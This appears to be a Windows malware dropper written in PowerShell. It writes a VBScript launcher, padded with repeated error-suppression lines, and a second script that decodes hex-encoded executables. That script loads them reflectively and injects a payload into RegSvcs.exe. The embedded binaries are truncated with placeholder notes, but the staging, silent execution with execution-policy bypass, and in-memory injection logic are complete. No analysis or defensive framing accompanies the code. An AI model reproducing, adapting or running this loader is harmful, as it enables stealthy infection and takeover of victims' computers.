$xa = "$env:USERPROFILE\AppData\Roaming\Logs"
New-Item $xa -ItemType Directory -Force
$Content = @'
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
set A = CreateObject("WScript.Shell")
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
A.run "powershell -ExecutionPolicy Bypass iex([IO.File]::ReadAllText('%USERPROFILE%\AppData\Roaming\Logs\Report.ps1'))",0
'@
[IO.File]::WriteAllText("$env:USERPROFILE\AppData\Roaming\Logs\Loader.vbs", $Content)
$Content = @'
Try{
function x {
param($JHX367)$JHX367 = $JHX367 -split '(..)' | ? { $_ }
ForEach ($UX2 in $JHX367){[Convert]::ToInt32($UX2,16)}}
[byte[]] $MyS  = x('4D5A9000...0000') # NOTE: The actual 184320-character Base64 string omitted for readability.
[byte[]] $serv  = x('4D5A900003...00000') # NOTE: The actual 128000-character Base64 string omitted for readability.
}catch{}
Try{
$str = "GetType"
$str[-1..-($str.length)]
}catch{}
Try{
$str1 = "Load"
$str1[-1..-($str.length)]
}catch{}
Try{
$str2 = "GetMethod"
$str2[-1..-($str.length)]
}catch{}
Try{
$str3 = "Invoke"
$str3[-1..-($str.length)]
}catch{}
Try{
$str4 = 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe'
$str4[-1..-($str.length)]
}catch{}
Try{
$str5 = 'Execute'
$str5[-1..-($str.length)]
}catch{}
[Reflection.Assembly]::$str1($MyS).$str('NewPE2.PE').$str2($str5).$str3($null,[object[]] ($str4,$serv))
'@
[IO.File]::WriteAllText("$env:USERPROFILE\AppData\Roaming\Logs\Report.ps1", $Content)